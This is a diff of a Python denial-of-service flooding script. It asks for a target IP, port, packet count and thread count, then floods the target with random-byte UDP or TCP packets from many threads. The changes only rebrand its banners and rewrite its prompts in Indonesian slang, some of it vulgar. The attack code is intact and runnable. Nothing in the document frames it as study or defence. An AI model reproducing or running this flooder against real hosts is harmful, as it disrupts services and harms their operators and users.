@@ -3,18 +3,19 @@ import random
 import socket
 import threading
 
-print ("DerZ")                                                               
-
-print       (" >> TOOLS CREATED BY DERZ <<")
-print       (" >> DISCORD : DerZ#2861 << ")
-print       (">> DON'T ABUSE MY TOOLS <<")                                   
-print       (" >> DM ME IF YOU NEED HELP <<")
+print       (" - - > Lord DerZ nih dek!! < - - ")
+print       (" - - > DerZ Nih Dek!!!! < - - ")
+print       (" - - > Join DerZ Team <- - ")                                   
+print       (" - - > Rename Pm Gw !! < - - ")
+print       (" - - > DerZ Nih dek  < - - ")
+print       (" - - > Tuh link nya Join!! < - - ")
+print       (" - - >  DERZ TEAM KATA ILHAM  < - - ")
     
-ip = str(input("  HOST/IP:"))
+ip = str(input("  IP/HOST:"))
 port = int(input(" PORT:"))
-choice = str(input(" Yakin Nihh?(y/n):"))
-times = int(input(" Paket:"))
-threads = int(input(" Threads:"))
+choice = str(input(" SERIUS NIHH MAU NYERANG HA ? (y/n):"))
+times = int(input(" PAKET NYA MAU BERAPA NIEH:"))
+threads = int(input(" MAU BERAPA PELOR NIEH:"))
 def run():
 	data = random._urandom(1000)
 	i = random.choice(("[+]","[-]"))
@@ -24,9 +25,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" DerZ ATTACKED THE SERVER")
+			print(i +" Paket From Lord Xinzu!!! ")
 		except:
-			print("[!] ERROR SERVER TIME OUT")
+			print("[!] Down Kontol!!!")
 
 def run2():
 	data = random._urandom(16)
@@ -38,10 +39,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" DerZ ATTACKED THE SERVER ")
+			print(i +" Paket From Lord Xinzu!!! ")
 		except:
 			s.close()
-			print("[*] ERROR SERVER TIME OUT")
+			print("[*] Down Kontol!!!")
             
 for y in range(threads):
 	if choice == 'y':
@@ -49,4 +50,4 @@ for y in range(threads):
 		th.start()
 	else:
 		th = threading.Thread(target = run2)
-		th.start()
+		th.start()                                             
